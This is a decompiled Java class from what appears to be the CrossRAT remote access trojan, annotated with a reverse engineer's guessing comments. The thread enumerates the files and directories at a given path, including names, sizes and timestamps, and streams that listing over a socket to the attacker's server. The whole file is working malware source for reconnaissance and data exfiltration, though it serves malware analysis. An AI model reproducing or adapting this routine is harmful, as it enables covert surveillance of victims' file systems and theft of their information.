package crossrat;

final class c extends Thread {
    private String a;

    public c(String var1) {
        this.a = var1;
    }

    public final void run() {
        new e();
        // this.a is initialized by constructor
        // I think maybe "this.a" is some dircetory path
        String var1 = this.a;
        // listFiles return file list of directory, (directory included)
        File[] var8 = (new File(var1)).listFiles();
        String var2 = "";
        if (var8 != null) {
            File[] var5 = var8;
            int var4 = var8.length;

            // var2 is file list in directory 'this.a/'
            // 'D' means that it is dir and 'F' menas it is file.
            // EX) D$#@directory_name$#@^!@F$#@file_name$#sizeof(file_name)^!@(last_modified)...
            for (int var3 = 0; var3 < var4; ++var3) {
                File var9;
                if ((var9 = var5[var3]).isDirectory()) {
                    var2 = var2 + 'D' + k.d + var9.getName() + k.d + k.e;
                } else {
                    var2 = var2 + 'F' + k.d + var9.getName() + k.d + var9.length() + k.d + var9.lastModified() + k.d + k.e;
                }
            }

            try {
                DataOutputStream var10;
                (var10 = new DataOutputStream(k.l.getOutputStream())).writeBytes(k.g + k.d + k.B + k.d + "&&&");

                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException var6) {
                    Thread.currentThread().interrupt();
                }


                // send var2 (file list data) to server.
                var10.flush();
                var2 = var2 + k.C;
                ByteArrayInputStream var11 = new ByteArrayInputStream(var2.getBytes());
                BufferedInputStream var12 = new BufferedInputStream(var11);
                // maybe, k.l is socket that is connected to server
                OutputStream var13 = k.l.getOutputStream();
                byte[] var14 = new byte[2047];

                while ((var4 = var12.read(var14)) != -1) {
                    // send encapsulated data to sever
                    var13.write(var14, 0, var4);
                    Thread.sleep(100L);
                }

                var11.close();
                var12.close();
                return;
            } catch (Exception var7) {
                // error handling
                var7.printStackTrace();
            }
        }

    }
}
